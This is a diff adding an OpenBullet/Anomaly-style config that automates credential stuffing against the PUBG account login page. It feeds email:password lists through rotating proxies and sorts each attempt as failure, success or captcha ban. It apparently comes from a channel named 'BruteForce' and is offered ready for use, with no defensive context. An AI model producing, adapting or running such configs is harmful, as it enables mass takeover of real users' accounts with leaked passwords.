@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Pubg Selenium",
+  "SuggestedBots": 2,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-01T00:29:19.2913429+02:00",
+  "AdditionalInfo": "T.me/BruteForce",
+  "Author": "H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+#SetWith BROWSERACTION SetWidth "420" 
+
+NAVIGATE "https://accounts.pubg.com/login" 
+
+BROWSERACTION SendKeys "<USER>||<TAB>||<PASS>" 
+
+#D FUNCTION Delay "1000" 
+
+BROWSERACTION SendKeys "<ENTER>" 
+
+ELEMENTACTION Id "" 
+  WaitForElement "2s" 
+
+BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Can't find an account with that email and password." 
+  KEYCHAIN Success OR 
+    KEY "LOGOUT" 
+  KEYCHAIN Ban OR 
+    KEY "Please confirm the captcha" 
+
